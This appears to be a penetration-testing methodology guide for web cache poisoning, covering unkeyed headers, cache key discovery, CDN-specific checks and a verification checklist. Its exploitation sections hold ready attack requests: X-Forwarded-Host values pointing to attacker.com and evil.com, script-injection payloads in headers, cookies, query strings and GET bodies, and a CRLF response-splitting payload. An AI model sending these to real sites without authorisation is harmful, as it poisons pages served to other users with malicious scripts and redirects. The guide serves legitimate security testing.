# Web Cache Poisoning Testing Methodology

## Quick Reference

**Key Concepts:**
- Cache keys: Parts of request that identify cached response
- Unkeyed inputs: Parts NOT in cache key but affect response
- Goal: Inject malicious content into cached response

**Common Unkeyed Inputs:**
- `X-Forwarded-Host`
- `X-Original-URL`
- `X-Rewrite-URL`
- Query parameters (sometimes)
- Cookies (sometimes)

---

## Cache Poisoning Basics

Web cache poisoning exploits:
1. Cache stores response keyed by URL/Host
2. Attacker injects malicious content via unkeyed input
3. Poisoned response served to other users

---

## Finding Cacheable Endpoints

### Cache Headers

```
Cache-Control: public, max-age=3600
Cache-Control: s-maxage=3600
Age: 123
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Fastly-Debug-Digest: ...
```

### Testing Cache Behavior

```bash
# Add cache buster to test
curl "https://target.com/page?cachebuster=123"

# Check if response is cached
curl "https://target.com/page?cachebuster=123"
# Look for Age header incrementing, X-Cache: HIT
```

---

## Identifying Unkeyed Inputs

### Common Headers to Test

```
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: attacker.com
Forwarded: host=attacker.com
```

### Testing Methodology

1. Add unkeyed header with unique value
2. Check if value reflected in response
3. Check if response is cached
4. Request without header - does poisoned response return?

```bash
# Step 1: Poison
curl -H "X-Forwarded-Host: evil.com" "https://target.com/page?cb=1"
# Check if evil.com appears in response

# Step 2: Verify poison
curl "https://target.com/page?cb=1"
# Does evil.com appear without the header?
```

---

## Exploitation Techniques

### Basic Host Header Poisoning

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If response includes:
```html
<script src="https://attacker.com/static/app.js"></script>
```

And response is cached, all users get attacker's script.

### Selective Poisoning via Vary

If `Vary: User-Agent`:
```http
GET /page HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (iPhone...)
X-Forwarded-Host: attacker.com
```

Only poisons cache for that specific User-Agent.

### Poisoning via Query Parameters

Some caches exclude query params from key:

```
GET /page?evil=<script>alert(1)</script> HTTP/1.1
```

If query param reflected but not keyed, poison succeeds.

### Cookie-Based Poisoning

```http
GET /page HTTP/1.1
Host: target.com
Cookie: language=en"><script>alert(1)</script>
```

If cookie not in cache key but affects response.

---

## Exploitation Payloads

### XSS via Poisoned Import

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script><link href="
```

### Open Redirect Poisoning

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If redirect uses forwarded host:
```
Location: https://attacker.com/page
```

### Response Splitting

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com%0d%0aSet-Cookie:%20admin=true
```

---

## Cache Key Discovery

### Param Miner (Burp Extension)

Automatically finds unkeyed inputs.

### Manual Discovery

Test each header/parameter:
1. Add header with unique value + cache buster
2. Check if value reflected
3. Request again without header
4. If reflected value persists, it's unkeyed

### Common Unkeyed Inputs

**Headers:**
```
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Origin
```

**Parameters:**
```
utm_source, utm_medium, utm_campaign
callback (sometimes)
_ga, _gid (analytics)
```

---

## Fat GET Requests

Some servers process body in GET requests:

```http
GET /page HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=<script>alert(1)</script>
```

If body not in cache key but affects response.

---

## Cache Deception vs Cache Poisoning

### Cache Poisoning
- Attacker injects malicious content
- Other users receive poisoned response
- Requires unkeyed input

### Cache Deception
- Trick cache into storing sensitive response
- Attacker accesses cached sensitive data
- Different technique, related concept

---

## CDN-Specific Techniques

### Cloudflare

```
CF-Cache-Status: HIT
```

Test:
- X-Forwarded headers
- CF-Connecting-IP manipulation

### Akamai

```
X-Cache: TCP_HIT
X-Cache-Key: ...
```

Test:
- X-Forwarded-Host
- True-Client-IP

### Fastly

```
X-Served-By: cache-xxx
```

Test:
- Fastly-Debug header (if enabled)
- X-Forwarded-Host

### Varnish

```
X-Varnish: 123456
Via: 1.1 varnish
```

---

## Vary Header Exploitation

`Vary` header indicates which request headers affect response:

```
Vary: User-Agent, Accept-Language
```

Selective poisoning:
```http
# Poison for mobile users only
GET /page HTTP/1.1
User-Agent: iPhone
X-Forwarded-Host: evil.com
```

---

## Cache Key Normalization

Some caches normalize:
- Case folding: `/Page` = `/page`
- Trailing slash: `/page/` = `/page`
- Query string sorting: `?a=1&b=2` = `?b=2&a=1`

Test variations to find normalization behavior.

---

## Parameter Cloaking

Hide parameters from cache key:

```
# Ruby on Rails
/page;param=value

# Node.js/Express
/page?param=value

# Keyed differently by cache vs app
```

---

## Testing Workflow

1. **Find cacheable content:**
   - Look for cache headers
   - Identify static resources

2. **Identify cache key:**
   - Test URL variations
   - Check Vary header

3. **Find unkeyed inputs:**
   - Test X-Forwarded-* headers
   - Test query parameters
   - Use Param Miner

4. **Confirm reflection:**
   - Check if unkeyed input affects response
   - Check for XSS opportunities

5. **Verify poisoning:**
   - Send poisoned request
   - Request without poison
   - Confirm poisoned response served

---

## Impact Assessment

### High Impact
- XSS on widely-accessed pages
- Open redirect to phishing
- Response splitting

### Medium Impact
- Denial of service (poison with errors)
- Information disclosure

### Low Impact
- Limited to specific paths
- Requires specific conditions

---

## Verification Checklist

1. **Identify caching:**
   - [ ] Cache headers present
   - [ ] Response is cached

2. **Find cache key:**
   - [ ] Test URL variations
   - [ ] Check Vary header

3. **Find unkeyed inputs:**
   - [ ] Test X-Forwarded-* headers
   - [ ] Test other headers
   - [ ] Test parameters

4. **Confirm poisoning:**
   - [ ] Inject payload via unkeyed input
   - [ ] Verify payload persists
   - [ ] Verify served to other users

5. **Document evidence:**
   - [ ] Poisoned request
   - [ ] Clean request showing poisoned response
   - [ ] Impact description
